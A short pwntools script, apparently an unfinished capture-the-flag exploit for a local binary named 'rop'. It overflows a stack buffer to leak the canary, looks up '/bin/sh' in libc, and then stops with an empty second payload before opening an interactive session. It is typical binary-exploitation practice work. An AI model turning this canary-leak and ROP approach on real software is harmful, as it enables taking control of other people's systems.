from pwn import *

def slog(name,addr): return success(': '.join([name, hex(addr)]))

p = process("./rop")
libc = ELF("./libc.so.6", checksec=False)

binsh = libc.search(b"/bin/sh")
print(binsh)

buffer = b'a'*0x30
sfp = b'b'*0x8
dummy = b'a'*0x1

payload = b''
payload += buffer + sfp + dummy

print(payload)

p.sendafter("Buf: ",payload)
p.recvuntil(buffer+sfp+dummy)
canary = u64(b'\x00' + p.recv(7))
slog('canary',canary)

payload = b''


p.interactive()